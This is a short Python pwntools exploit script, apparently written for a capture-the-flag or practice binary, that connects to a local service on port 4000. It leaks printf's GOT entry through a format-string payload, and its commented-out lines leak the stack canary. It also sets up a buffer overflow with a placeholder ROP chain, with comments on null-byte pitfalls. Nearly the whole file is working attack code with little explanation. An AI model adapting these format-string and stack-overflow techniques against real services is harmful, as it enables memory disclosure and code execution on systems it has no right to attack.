from pwn import *

r = remote('127.0.0.1', 4000)
printf_got = 0x601020
# it prints padding spaces and nothing
#r.sendline(p64(printf_got) + ' %6$s')
# however, if there is a byte in the content of printf_got is '\0',
# you will print nothing. and nothing you can do.
r.sendline('%7$s'.ljust(8) + p64(printf_got))
x = r.recvrepeat(0.3)
print enhex(x)


# p64(0x601020) will be parsed as ' \x10`\x00\x00\x00\x00\x00'
# so if print it directly, the upper digit \x00 will be thought
# as the trailing \x00. so only ' \x10`' will be printed.
#r.sendline(p64(printf_got) + ' %6$s')
r.interactive()
#r.sendline('%19$016lx>>')
canary = int(r.recvuntil('>>')[:-2], 16)

print hex(canary)

rop = [
    0xAAAABBBBCCCCDDDD,
]

# r.sendline('A'*104 + p64(canary) + 'B'*8 + ''.join(map(p64, rop)))

r.interactive()

